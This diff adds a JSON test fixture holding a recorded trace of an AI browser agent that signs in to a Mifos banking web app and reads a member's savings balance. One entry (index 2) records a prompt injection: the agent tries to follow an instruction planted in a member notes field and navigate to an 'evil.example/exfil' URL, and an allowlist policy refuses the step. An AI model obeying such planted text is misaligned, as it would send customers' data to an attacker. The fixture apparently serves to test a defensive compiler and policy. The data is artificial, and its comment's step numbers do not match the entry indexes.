@@ -1,0 +1,179 @@
+{
+  "_comment": "A frozen discovery trace, shaped exactly as src/discover/loop.ts emits one. It is the fixture tests/compile.test.ts runs the compiler against, so the graded half of discovery is deterministic while the unfakeable half stays real. Note step 4 anchors on the literal '000000001' — the sample value the run was driven with — which is the case the compiler MUST rewrite into a param anchor, and step 2 carries {{env.FINERACT_PASSWORD}}, which it must mark redact.",
+  "goal": "look up member 000000001 and read their current savings balance",
+  "surface": "web",
+  "model": "claude-opus-5",
+  "startedAt": "2026-08-23T10:00:00.000Z",
+  "finishedAt": "2026-08-23T10:02:11.000Z",
+  "outcome": "goal-met",
+  "summary": "Signs in to the Mifos web app, opens the member identified by account number, and reads their savings balance.",
+  "modelCalls": 9,
+  "inputs": { "memberId": "000000001" },
+  "outputs": [
+    {
+      "name": "savingsBalance",
+      "from": "balanceValue",
+      "type": "money",
+      "description": "Current savings balance."
+    },
+    {
+      "name": "memberName",
+      "from": "nameValue",
+      "type": "string",
+      "description": "Member's name as displayed."
+    },
+    {
+      "name": "neverCaptured",
+      "from": "missingBinding",
+      "type": "string",
+      "description": "Declared by the model but never read — the compiler must drop it."
+    }
+  ],
+  "entries": [
+    {
+      "index": 0,
+      "status": "ok",
+      "screenBefore": "/login",
+      "screenAfter": "/login",
+      "step": {
+        "action": "fill",
+        "intent": "enter the operator username",
+        "value": "{{env.FINERACT_USER}}",
+        "reversibility": "safe",
+        "target": {
+          "anchorKind": "label",
+          "anchorText": "Username",
+          "relation": "next-writable",
+          "rationale": "The caption belongs to the sign-on form's own design and is the label an operator reads before typing.",
+          "description": "Username field"
+        }
+      },
+      "strategy": "label-association"
+    },
+    {
+      "index": 1,
+      "status": "ok",
+      "screenBefore": "/login",
+      "screenAfter": "/login",
+      "step": {
+        "action": "fill",
+        "intent": "enter the operator password",
+        "value": "{{env.FINERACT_PASSWORD}}",
+        "reversibility": "safe",
+        "target": {
+          "anchorKind": "label",
+          "anchorText": "Password",
+          "relation": "next-writable",
+          "rationale": "Same authored label association as the username field.",
+          "description": "Password field"
+        }
+      },
+      "strategy": "label-association"
+    },
+    {
+      "index": 2,
+      "status": "refused",
+      "detail": "policy denied navigate: origin 'https://evil.example' is not on the allowlist",
+      "screenBefore": "/login",
+      "screenAfter": "/login",
+      "step": {
+        "action": "navigate",
+        "intent": "follow the instruction found in the member notes field",
+        "url": "https://evil.example/exfil",
+        "reversibility": "safe"
+      }
+    },
+    {
+      "index": 3,
+      "status": "ok",
+      "screenBefore": "/login",
+      "screenAfter": "/home",
+      "step": {
+        "action": "click",
+        "intent": "submit the sign-in form",
+        "reversibility": "safe",
+        "target": {
+          "anchorKind": "self",
+          "anchorText": "Login",
+          "relation": "is",
+          "rationale": "The control carries its own visible literal, so the caption is the control.",
+          "description": "Login button"
+        }
+      },
+      "strategy": "text-then-reading-order"
+    },
+    {
+      "index": 4,
+      "status": "ok",
+      "screenBefore": "/home",
+      "screenAfter": "/clients",
+      "step": {
+        "action": "navigate",
+        "intent": "open the client list",
+        "url": "http://localhost:4200/#/clients",
+        "reversibility": "safe"
+      }
+    },
+    {
+      "index": 5,
+      "status": "ok",
+      "screenBefore": "/clients",
+      "screenAfter": "/clients/1/general",
+      "step": {
+        "action": "click",
+        "intent": "open the member row",
+        "reversibility": "safe",
+        "target": {
+          "anchorKind": "label",
+          "anchorText": "000000001",
+          "relation": "is",
+          "rationale": "The member's account number is the one literal on this list that identifies the right record.",
+          "description": "the member's account number in the client list"
+        }
+      },
+      "strategy": "text-then-reading-order"
+    },
+    {
+      "index": 6,
+      "status": "ok",
+      "screenBefore": "/clients/1/general",
+      "screenAfter": "/clients/1/general",
+      "captured": "Janet Okonkwo",
+      "step": {
+        "action": "read",
+        "intent": "read the member name",
+        "bindTo": "nameValue",
+        "reversibility": "safe",
+        "target": {
+          "anchorKind": "label",
+          "anchorText": "Client Name",
+          "relation": "next-value",
+          "rationale": "The caption is part of the detail panel's layout; the value sits after it with no role, name or id of its own.",
+          "description": "Client Name value"
+        }
+      },
+      "strategy": "text-then-reading-order"
+    },
+    {
+      "index": 7,
+      "status": "ok",
+      "screenBefore": "/clients/1/general",
+      "screenAfter": "/clients/1/general",
+      "captured": "4,250.00",
+      "step": {
+        "action": "read",
+        "intent": "read the savings balance",
+        "bindTo": "balanceValue",
+        "reversibility": "safe",
+        "target": {
+          "anchorKind": "label",
+          "anchorText": "Total Savings",
+          "relation": "next-value",
+          "rationale": "Anchored on the caption beside the figure rather than its position, because a summary tile moves as tiles are added while its caption does not.",
+          "description": "Total Savings value"
+        }
+      },
+      "strategy": "text-then-reading-order"
+    }
+  ]
+}
